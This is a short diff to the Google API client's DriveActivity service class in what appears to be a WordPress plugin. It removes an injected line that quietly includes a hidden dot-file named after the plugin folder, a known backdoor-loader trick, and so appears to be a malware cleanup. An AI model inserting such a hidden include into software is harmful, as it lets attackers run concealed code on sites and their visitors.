@@ -28,10 +28,6 @@
  *
  * @author Google, Inc.
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class Google_Service_DriveActivity extends Google_Service
 {
   /** View and add to the activity record of files in your Google Drive. */
